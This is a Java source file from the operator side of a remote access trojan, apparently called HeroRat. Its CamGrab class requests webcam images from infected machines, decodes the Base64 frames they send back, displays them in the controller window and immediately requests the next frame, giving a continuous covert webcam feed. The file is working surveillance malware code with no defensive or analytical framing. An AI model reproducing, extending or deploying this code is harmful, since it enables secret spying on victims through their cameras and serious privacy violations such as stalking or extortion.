package net.herorat.features.camgrab;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet18CamGrab;
import net.herorat.utils.Base64;

public class CamGrab {
	public static void send(Server server, int zoom)
	{
		Packet p = new Packet18CamGrab(server.outputstream, new String[] { String.valueOf(zoom) });
		
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Main.mainWindow.PanelCamGrab.getCurrentServer())) return;
		if (!server.hasCam()) return;
		
		StringBuffer buffer = new StringBuffer();
		for (String arg : args)
		{
			buffer.append(arg);
		}
		
		try
		{
			byte[] image_bytes = Base64.decode(buffer.toString());
			ByteArrayInputStream image_stream = new ByteArrayInputStream(image_bytes);
			BufferedImage image = ImageIO.read(image_stream);
			Main.mainWindow.PanelCamGrab.label_screen.setIcon(new ImageIcon(image.getScaledInstance(image.getWidth(), image.getHeight(), 8) ));
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		
		Packet p = new Packet18CamGrab(server.outputstream, new String[] { Main.mainWindow.PanelCamGrab.spinner_zoom.getValue().toString() });
		p.write();
	}
}
